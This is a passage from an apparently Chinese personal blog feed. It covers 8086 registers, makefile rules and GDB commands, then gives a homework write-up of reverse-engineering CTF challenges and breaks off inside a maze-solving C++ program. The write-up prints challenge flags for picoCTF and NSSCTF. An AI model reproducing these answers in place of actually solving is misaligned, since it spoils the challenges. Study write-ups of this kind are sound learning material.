        <content type="html"><![CDATA[<h1 id="8086寄存器"><a href="#8086寄存器" class="headerlink" title="8086寄存器"></a>8086寄存器</h1><p>不同CPU的寄存器个数结构不同,对于8086CPU,有14个寄存器,分为:</p><p>​AX,BX,CX,DX,SI,DI,SP,BP,IP,CS,SS,DS,ES,PSW</p><h1 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h1><p>在x86架构的汇编语言中ax,bx,cx,dx是通用寄存器,用于存储数据或进行算术运算。这些寄存器的功能区别如下：</p><ol><li>AX (Accumulator): AX寄存器是累加器寄存器,用于执行算术和逻辑操作,以及存放函数返回值。在乘法和除法运算中,AX寄存器存储乘法的结果或除法的被除数。</li><li>BX (Base Register): BX寄存器通常用作基址寄存器,用于存放内存访问中的偏移地址。在一些特殊情况下,BX也可以用作通用寄存器。</li><li>CX (Count Register): CX寄存器通常用作计数器,特别是在循环操作中。它可以作为循环的计数值,并在循环执行过程中递减。</li><li>DX (Data Register): DX寄存器常用于存放一些数据,例如乘法的乘数或除法的除数。</li></ol><p>8086的寄存器均为16位,一个16位寄存器又可分为两部分,即kH,kL(k为A,B,C,D),各为一个字节(2字节&#x2F;16位为一个字)</p><h2 id="AX寄存器"><a href="#AX寄存器" class="headerlink" title="AX寄存器"></a>AX寄存器</h2><p>​AX寄存器一般用来存储临时数据,存储函数返回值,存储控制信息等,所以经常被用于MOV指令</p><h2 id="BX寄存器"><a href="#BX寄存器" class="headerlink" title="BX寄存器"></a>BX寄存器</h2><p>​BX寄存器通常用于内存寻址,即用于存储内存地址或作为其他寄存器的间接寻址寄存器</p><p>​例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOV BX, 2000h    ; 将数据2000h传送到BX寄存器，作为内存地址</span><br><span class="line">MOV AX, [BX]     ; 将BX寄存器中存储的地址所对应的内存数据传送到AX寄存器</span><br><span class="line">MOV [BX], CX     ; 将CX寄存器的值传送到BX所指向的内存地址</span><br></pre></td></tr></table></figure><h2 id="CX寄存器"><a href="#CX寄存器" class="headerlink" title="CX寄存器"></a>CX寄存器</h2><p>​CX寄存器常用于计数器,用来在循环中(Loop)计数和存储计数值</p><p>​Loop &lt;标号&gt;命令执行时,会进行两步操作:</p><p>​1.(cx)&#x3D;(cx)-1;</p><p>​2.判断cx是否为0,如果为0则向下执行,否则跳转至标号处执行程序]</p><h2 id="DX寄存器"><a href="#DX寄存器" class="headerlink" title="DX寄存器"></a>DX寄存器</h2><p>​DX常用于存储数据或者作为数据传输的缓冲区,例如存储循环累加的值</p><h1 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h1><p>​在 8086 处理器中，共有四个段寄存器，它们是 CS (Code Segment)、DS (Data Segment)、SS (Stack Segment) 和 ES (Extra Segment),各个段寄存器的功能如下:</p><ol><li>CS (Code Segment)：指向代码段的起始地址，用于存储程序代码的位置。CS 寄存器中的内容加上指令的偏移地址，形成实际的物理地址，从而取得代码段中的指令。</li><li>DS (Data Segment)：指向数据段的起始地址，用于存储程序的全局数据和静态数据。DS 寄存器中的内容加上数据的偏移地址，形成实际的物理地址，从而访问数据段中的数据。</li><li>SS (Stack Segment)：指向栈段的起始地址，用于存储程序的运行时栈。SS 寄存器中的内容加上栈中数据的偏移地址，形成实际的物理地址，从而操作栈中的数据。</li><li>ES (Extra Segment)：额外段寄存器，用于存储其他数据段的起始地址。在特定情况下，程序可以使用 ES 寄存器来访问额外的数据段。</li></ol><p>参阅:</p><p>​<a href="https://blog.csdn.net/tju_zxl/article/details/128766360">https://blog.csdn.net/tju_zxl/article/details/128766360</a></p>]]></content>
      
      
      <categories>
          
          <category> 汇编语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
            <tag> 寄存器 </tag>
            
            <tag> 8086 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>makefile的使用</title>
      <link href="/2023/07/29/%E5%85%B6%E4%BB%96/makefile%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/07/29/%E5%85%B6%E4%BB%96/makefile%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="makefile基本规则"><a href="#makefile基本规则" class="headerlink" title="makefile基本规则"></a>makefile基本规则</h1><p>一.格式:</p><p>​<strong>Target</strong> : Dependencies…</p><p>​Command…</p><p>​这即为一个规则,其中:</p><p>​1.Target 为目标,是规则的名字,也是make命令的入口.</p><p>​Target可以是目标文件—main.o main等等</p><p>​也可以是伪目标—并非真正要生成的文件,而是一个标签,不要和实际要生成的文件同名,一般为一个有意义的名字,可以描述其下Command命令功能的名字</p><p>​Target中一般只有一个文件;多个文件用空格分开,但是必须为相同类型的文件</p><p>​2.<strong>Dependencies</strong>为依赖文件列表</p><p>​例如main依赖main.o和hello.o,即为:</p><p>​main:main.o hello.o</p><p>​如果依赖文件一个都不写的话,那么只要输入make命令command命令就会执行</p><p>一般都将生成可执行文件的规则放在第一个,如下(?):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190209136.png" alt="image-20230729190209136" style="zoom:33%;" /></p><p>如果不想将命令显示出来,在每条Command命令前都加上@即可:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190236956.png" alt="image-20230729190236956" style="zoom:33%;" /></p><p>二.自动化变量</p><p>1.每一条规则都有互不冲突的变量:</p><table><thead><tr><th>$&lt;</th><th>规则的第一个依赖文件名</th></tr></thead><tbody><tr><td>$^</td><td>规则的所有依赖文件列表</td></tr><tr><td>$@</td><td>规则的目标文件名</td></tr></tbody></table><p>使用自动化变量可以简化规则的书写,例如:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190322189.png" alt="image-20230729190322189" style="zoom: 33%;" /></p><p><strong>注意:自动化变量只能用于Command中,不能用于每个规则的第一行</strong></p><p>2.可以定义变量替代一系列文件名:</p><p>targets&#x3D;main.o add.o sub.o</p><p>该变量相当于全局变量,可以用在任何出现main.o add.o sub.o的地方</p><p>但是使用的时候写法为$(targets)而不能直接使用targets</p><p>一般只需要定义如下变量放于开头:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190425899.png" alt="image-20230729190425899" style="zoom:33%;" /></p><p>分别为:最后可执行文件的变量;生成该可执行文件所需要的所有.o文件的变量;所有头文件的变量</p><h1 id="makefile的简化"><a href="#makefile的简化" class="headerlink" title="makefile的简化"></a>makefile的简化</h1><p>一.%.o:%.c</p><p>观察下面规则:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190520197.png" alt="image-20230729190520197" style="zoom:33%;" /></p><p>可以使用</p><p>​%.o:%.c</p><p>​gcc -c $&lt; -o $@</p><p>来简化</p><p>%.o代表所有的.o文件,%.c代表所有的.c文件</p><p><strong>注意</strong>:尽管写在了一起,但是仍然是”只有发生改变的文件以及与该文件有依赖关系的文件才会重新编译”</p><h1 id="makefile隐含规则"><a href="#makefile隐含规则" class="headerlink" title="makefile隐含规则"></a>makefile隐含规则</h1><p>隐含规则是系统在makefile中已经写好的,隐含的一些规则</p><p>1.将.c文件编译生成.o文件</p><p>​make会自动推导出这种规则,并生成.o文件</p><p>​所以前面的规则可以写成:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190606717.png" alt="image-20230729190606717" style="zoom:33%;" /></p><h1 id="存在多个makefile文件时执行哪一个"><a href="#存在多个makefile文件时执行哪一个" class="headerlink" title="存在多个makefile文件时执行哪一个"></a>存在多个makefile文件时执行哪一个</h1><p>1.make命令能够找到的makeflie文件只能是makefile或Makefile</p><p>​其他名字需要使用-f参数,例如:</p><p>​make -f makefile1</p><p>​make clean -f makefile1</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190646494.png" alt="image-20230729190646494" style="zoom:25%;" /></p>]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
            <tag> makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB调试的使用</title>
      <link href="/2023/07/29/%E4%BA%8C%E8%BF%9B%E5%88%B6/GDB%E8%B0%83%E8%AF%95%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/07/29/%E4%BA%8C%E8%BF%9B%E5%88%B6/GDB%E8%B0%83%E8%AF%95%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="GDB概述"><a href="#GDB概述" class="headerlink" title="GDB概述"></a>GDB概述</h1><h2 id="GDB组成架构"><a href="#GDB组成架构" class="headerlink" title="GDB组成架构"></a>GDB组成架构</h2><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/241-s2r1grmfpvr.png" alt="img" style="zoom:50%;" /><h2 id="基本工作原理"><a href="#基本工作原理" class="headerlink" title="基本工作原理"></a>基本工作原理</h2><p>gdb 通过系统调用 <code>ptrace</code> 来接管一个进程的执行。ptrace 系统调用提供了一种方法使得父进程可以观察和控制其它进程的执行，检查和改变其核心映像以及寄存器。它主要用来实现断点调试和系统调用跟踪。</p><h3 id="三种调试方式"><a href="#三种调试方式" class="headerlink" title="三种调试方式"></a>三种调试方式</h3><p>​直接运行并调试一个新进程</p><p>​运行并调试一个新进程</p><p>​运行 gdb，通过命令行或 <code>file</code> 命令指定目标程序。</p><p>​输入<code>run</code>命令， gdb 执行下面的操作：</p><p>​通过 <code>fork()</code> 系统调用创建一个新进程</p><p>​在新创建的子进程中执行操作：<code>ptrace(PTRACE_TRACEME, 0, 0, 0)</code></p><p>​在子进程中通过 <code>execv()</code> 系统调用加载用户指定的可执行文件</p><p>​attach并调试一个已经运行的进程</p><p>​用户确定需要进行调试的进程 PID</p><p>​运行 gdb，输入 <code>attach &lt;pid&gt;</code>，gdb 将对指定进程执行操作：<code>ptrace(PTRACE_ATTACH, pid, 0, 0)</code></p><p>​远程调试目标机上新创建的进程</p><p>​gdb 运行在调试机上，gdbserver 运行在目标机上，两者之间的通信数据格式由 gdb 远程串行协议（Remote Serial Protocol）定义</p><p>​RSP 协议数据的基本格式为： <code>$..........#xx</code></p><p>​gdbserver 的启动方式相当于运行并调试一个新创建的进程</p><h1 id="使用GDB前的准备"><a href="#使用GDB前的准备" class="headerlink" title="使用GDB前的准备"></a>使用GDB前的准备</h1><p>编译</p><p>​一般关闭-o优化选项</p><p>​打开-g调试选项</p><p>​-Wall打开所有warning</p><h1 id="GDB启动-x2F-退出-x2F-查看代码命令"><a href="#GDB启动-x2F-退出-x2F-查看代码命令" class="headerlink" title="GDB启动&#x2F;退出&#x2F;查看代码命令"></a>GDB启动&#x2F;退出&#x2F;查看代码命令</h1><p>启动退出</p><p>​gdb 可执行文件 —启动调试</p><p>​quit&#x2F;ctrl+d —退出</p><p>设置参数&#x2F;获取设置参数</p><p>​set args 10 20</p><p>​show args</p><p>GDB使用帮助</p><p>​help</p><p>查看当前文件代码</p><p>​list&#x2F;l —从默认位置显示</p><p>​list&#x2F;l &lt;行号&gt; —从制定的行显示</p><p>​list&#x2F;l &lt;函数名&gt; —从指定的函数开始显示</p><p>​disassemble&#x2F;disas —反汇编命令</p><p>​<code>disas &lt;func&gt;</code> 反汇编指定函数</p><p>​<code>disas &lt;addr&gt;</code> 反汇编某地址所在函数</p><p>​<code>disas &lt;begin_addr&gt; &lt;end_addr&gt;</code> 反汇编从开始地址到结束地址的部分</p><p>查看非当前文件代码</p><p>​list&#x2F;l &lt;文件名:行号&gt;</p><p>​list&#x2F;l &lt;文件名:函数名&gt;</p><p>设置显示的行数</p><p>​show list&#x2F;listsize</p><p>​set list&#x2F;listsize &lt;行数&gt;</p><p>其他</p><p>​pwd —显示工作目录</p><p>​shell —不离开gdb就能运行shell命令</p><p>​directory&#x2F;dir —设置查找源文件的路径(或者gdb的-d参数)</p><h1 id="GDB断点命令"><a href="#GDB断点命令" class="headerlink" title="GDB断点命令"></a>GDB断点命令</h1><p>设置断点</p><p>​b&#x2F;break &lt;行号&gt;</p><p>​b&#x2F;break &lt;函数名&gt;</p><p>​b&#x2F;break &lt;文件名:行号&gt;</p><p>​b&#x2F;break &lt;文件名:函数名&gt;</p><hr><p>​tbreak —临时断点,如同break,只不过在一次命中后被删除</p><p>查看断点</p><p>​i&#x2F;info b&#x2F;break</p><p>删除断点</p><p>​d&#x2F;del&#x2F;delete 断点编号</p><p>设置断点无效</p><p>​dis&#x2F;disable 断点编号</p><p>设置断点生效</p><p>​ena&#x2F;enable 断点编号</p><p>设置条件断点</p><p>​b&#x2F;break 10 if i&#x3D;&#x3D;5</p><h1 id="GDB调试运行命令"><a href="#GDB调试运行命令" class="headerlink" title="GDB调试运行命令"></a>GDB调试运行命令</h1><p>运行GDB</p><p>​start —停止于第一行</p><p>​run —运行到下一个断点</p><p>继续运行到下一个断点</p><p>​c&#x2F;continue</p><p>向下执行一段代码(不会进入函数体)</p><p>​n&#x2F;next</p><p>向下单步调试(遇到函数步进)</p><p>​s&#x2F;step —步进</p><p>​finish —运行直至跳出函数体</p><p>反向步进程序</p><p>​reverse-step [n] —反向步进程序,直到到达另一个源码行的开头,n表示执行n次,或某种原因程序停止</p><p>变量操作</p><p>​p&#x2F;print 变量名 —打印值</p><p>​ptype 变量名 —打印类型</p><p>自动变量操作</p><p>​display num —自动打印指定变量的值</p><p>​undisplay —取消…</p><p>​i&#x2F;info display</p><p>​undisplay 编号</p><p>其他操作</p><p>​until —跳出循环</p><p>​until &lt;行号&gt; —在函数内，进行指定位置跳转，执行完区间代码</p><h1 id="表达式监视-x2F-修改命令"><a href="#表达式监视-x2F-修改命令" class="headerlink" title="表达式监视&#x2F;修改命令"></a>表达式监视&#x2F;修改命令</h1><p>print &lt;表达式&gt; —对任意正确的表达式进行求值并打印</p><p>display &lt;表达式&gt; —每次单步进行指令后,紧接着输出被设置的表达式及值(单步运行非常有用)</p><p>watch &lt;表达式&gt; —设置一个监视点,一旦被监视的”表达式”的值改变,gdb将强行终止正在被调试的程序</p><p>​另外 <code>rwatch</code> 表示在访问时停止，<code>awatch</code> 表示在访问和改变时都停止</p><p>whatis —查询变量或函数</p><p>info &lt;函数&gt; —查询函数</p><p>info locals —查看当前堆栈页所有的变量</p><p>set var 变量名&#x3D;变量值 —修改变量的值</p><h1 id="特殊执行命令"><a href="#特殊执行命令" class="headerlink" title="特殊执行命令"></a>特殊执行命令</h1><p>运行代码</p><p>​call 函数(参数) —调用和执行函数</p><p>​return <expression> —取消函数调用的执行,expression被当做函数的返回值</p><p>生成代码</p><p>​make —不退出gdb就能重新产生可执行文件</p><h1 id="内存查看命令"><a href="#内存查看命令" class="headerlink" title="内存查看命令"></a>内存查看命令</h1><table><thead><tr><th>命令</th><th align="left">子选项</th><th>解释</th></tr></thead><tbody><tr><td>x</td><td align="left">x&#x2F;3 内存地址</td><td>需要显示的内存单元的个数，也就是说从当前地址向后显示几个内存单元的内容，一个内存单元的大小由后面的u定义</td></tr><tr><td></td><td align="left">x&#x2F;f 内存地址</td><td>f 表示显示的格式 ：  x 按十六进制格式显示变量。  d 按十进制格式显示变量。   u 按十进制格式显示无符号整型。   o 按八进制格式显示变量。   t 按二进制格式显示变量。   a 按十六进制格式显示变量。   i 指令地址格式   c 按字符格式显示变量。   f 按浮点数格式显示变量。</td></tr><tr><td></td><td align="left">x&#x2F;u 内存地址</td><td>u表示一个地址单元的长度    b表示单字节，    h表示双字节，    w表示四字节，    g表示八字节</td></tr><tr><td>举例</td><td align="left">x &#x2F;3dw 内存地址</td><td>打印3个四字节，按照10进制格式打印(即将上面各个部分组合起来)</td></tr></tbody></table><p>例如:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729165808207.png" alt="image-20230729165808207"></p><p>这里打印了str[0]~str[15]的所有值(以16进制)</p><p>另外,使用 $ida(“xxx”)可以通过IDA名称获取地址,例如 $ida(“main”)  (?)</p><h1 id="堆栈和寄存器处理命令"><a href="#堆栈和寄存器处理命令" class="headerlink" title="堆栈和寄存器处理命令"></a>堆栈和寄存器处理命令</h1><p>bt —查看当前函数调用栈,即当前函数调用的上一层函数以及它们的调用栈信息</p><p>up&#x2F;down n —在堆栈中向上&#x2F;向下移动n层</p><p>frame n —切换到第n层堆栈</p><p>info相关的命令</p><p>​info frame —查看当前堆栈帧的信息，包括函数名、参数、返回地址等</p><p>​info args —查看当前函数的参数信息</p><p>​info locals —查看当前函数的局部变量信息</p><p>​info registers —查看所有寄存器的信息</p><p>print &#x2F;x $reg —以16进制格式查看指定寄存器reg的值</p><p>set $reg &#x3D; value —设置指定寄存器reg的值为value</p><h1 id="查询运行状态命令"><a href="#查询运行状态命令" class="headerlink" title="查询运行状态命令"></a>查询运行状态命令</h1><p>where&#x2F;bt —当前运行的堆栈列表(?)&#x2F;查看程序出错原因</p><p>bt backtrace —显示当前调用堆栈</p><p>up&#x2F;down —改变堆栈显示的深度</p><p>info program —查看程序的是否在运行，进程号，被暂停的原因</p><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>1.GDB不会自动在程序入口点暂停,所以需要在执行前设置好断点</p><p>部分转载于:</p><p><a href="https://www.wenjiangs.com/doc/lkor5lfsdn#gdb-%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C"></a></p>]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GDB </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制作业第二周</title>
      <link href="/2023/07/28/%E4%BA%8C%E8%BF%9B%E5%88%B6/Writeup(%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BD%9C%E4%B8%9A%E7%AC%AC%E4%BA%8C%E5%91%A8)/"/>
      <url>/2023/07/28/%E4%BA%8C%E8%BF%9B%E5%88%B6/Writeup(%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BD%9C%E4%B8%9A%E7%AC%AC%E4%BA%8C%E5%91%A8)/</url>
      
        <content type="html"><![CDATA[<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="droids0-pico2019"><a href="#droids0-pico2019" class="headerlink" title="droids0(pico2019):"></a>droids0(pico2019):</h2><p>这是一个安卓逆向的入门题(根本没有逆向,老样子在帮你部署环境),根据hint去安装了Android Studio</p><p>​资料:</p><p>​<a href="https://blog.csdn.net/weixin_43734793/article/details/124966390">https://blog.csdn.net/weixin_43734793/article/details/124966390</a></p><p>​<a href="https://blog.csdn.net/andylao62/article/details/23456881">https://blog.csdn.net/andylao62/article/details/23456881</a></p><h3 id="安装的一点点事情"><a href="#安装的一点点事情" class="headerlink" title="安装的一点点事情:"></a>安装的一点点事情:</h3><p>​1.电脑要有JDK5或之后的版本</p><p>​2.安装后的初始化出现网络问题,即无法访问插件网址,这里因为电脑有某lash,进行了手动的代理设置</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728112025801.png" alt="image-20230728112025801" style="zoom:50%;" /></p><p>​正在疯狂解压↑</p><p>​<del>感觉和Jetbrain家风格好像(难道是一家的?)</del></p><p>​<del>怎么好多东西都是第一次使用要在线下载</del></p><h3 id="现在就直接运行一遍"><a href="#现在就直接运行一遍" class="headerlink" title="现在就直接运行一遍"></a>现在就直接运行一遍</h3><p>​根据提示了解到flag会在log中输出,直接运行就行:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728114115242.png" alt="image-20230728114115242" style="zoom: 25%;" /></p><p>​flag:   picoCTF{a.moose.once.bit.my.sister}</p><p>​虽然不是很懂,特别是连java都不会,但是好歹环境没问题</p><p>​<del>正解</del>到这里就结束了</p><h3 id="现在记录一点折腾的过程"><a href="#现在记录一点折腾的过程" class="headerlink" title="现在记录一点折腾的过程"></a>现在记录一点折腾的过程</h3><p>​<del>听说java中间会解释出某种叫做字节码的东西</del></p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728114819343.png" alt="image-20230728114819343" style="zoom:50%;" /></p><p>​假装看懂↑</p><p>​不管如何,我们凭借着c++(学姬算鸡)的底子,了解到怎么也得是先找到main函数入口:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728114942680.png" alt="image-20230728114942680" style="zoom: 50%;" /></p><p>​然后虽然看不懂字节码,但是硬看…(主要是现在还没有去搞java逆向的工具…待会儿折腾…):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728115047864.png" alt="image-20230728115047864" style="zoom:50%;" /></p><p>​你发现了吗…再往下看,凭借我小学800词的英语底子我看到了这个:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728115206070.png" alt="image-20230728115206070" style="zoom:50%;" /></p><p>​看来是某个类方法,但是属实是不会看这字节码,也不了解java apk的变量结构(<del>那就学</del>):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728115525767.png" alt="image-20230728115525767" style="zoom:50%;" /></p><p>​经过学习某个叫做smail的东西,我们可以知道是调用了某个静态函数(不知道是全局函数还是静态成员方法—java有全局函数吗?),那么进一步分析语法去找参数吧</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728120749186.png" alt="image-20230728120749186" style="zoom:50%;" /></p><p>​这东西为啥是空的…到此为止…字节码分析失败,以后还是得去看看java逆向,光有字节码不行</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728120855903.png" alt="image-20230728120855903" style="zoom:50%;" /></p><p>​盲猜v0寄存器里存的就是flag的主体,跪求哪位椰叶如果知道这个做法有没有搞头,评论踢我一脚…</p><p>​</p><p>​到此为止吧,至少运行跑出来了…</p><h2 id="Check-Your-Luck"><a href="#Check-Your-Luck" class="headerlink" title="Check_Your_Luck"></a>Check_Your_Luck</h2><p>很显然是求解线性方程组…但是我手头没有代码(线代老师饶了我吧QWQ)</p><p>我们使用正则(我太懒了):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">patt:</span><br><span class="line">\(v \* (-?[\d]+) \+ w \* (-?[\d]+) \+ x \* (-?[\d]+) \+ y \* (-?[\d]+) \+ z \* (-?[\d]+) \=\= (-?[\d]+)\)</span><br><span class="line">替换为:</span><br><span class="line">$1,$2,$3,$4,$5 $6\n</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728130450039.png" alt="image-20230728130450039" style="zoom: 50%;" /><p>处理后,丢入到在线计算线性方程组中(因为我没有写过求解线性方程组的代码—回头补上):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728130615285.png" alt="image-20230728130615285" style="zoom: 50%;" /></p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728130824736.png" alt="image-20230728130824736" style="zoom:33%;" /></p><p>​现在直接组装起flag即可…或者运行一遍…</p><p>​flag{4544_123_677_1754_777}注意要换成NSSCTF{4544_123_677_1754_777}</p><p>​正则真是个好东西啊,怎么各位做题都不用捏?<del>(还是说椰叶们用了但WP里没写)</del></p><p>​结束…</p><h2 id="help"><a href="#help" class="headerlink" title="help"></a>help</h2><p>​代码都一看就懂,会生成一个map地图,动调提取出来,然后肉眼写吧(路径是wasd四个方向也一眼就看出来了)</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728175513441.png" alt="image-20230728175513441" style="zoom:45%;" /><p>​处理脚本:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//BFS实现</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bitset&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> map2[] = &#123;</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span 